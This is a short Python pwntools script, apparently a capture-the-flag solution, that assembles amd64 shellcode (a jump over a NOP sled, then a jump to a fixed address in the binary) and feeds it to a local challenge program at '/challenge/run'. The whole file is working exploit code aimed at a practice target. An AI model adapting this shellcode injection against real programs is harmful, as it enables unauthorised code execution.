import pwn
pwn.context.update(arch="amd64")
code = pwn.asm(f"""
JMP .+0x53
{"nop;"*int("51", 16)}
POP rdi
MOV rax, 0x403000
JMP rax
""" )
process = pwn.process("/challenge/run")
process.write(code)
print(process.readall())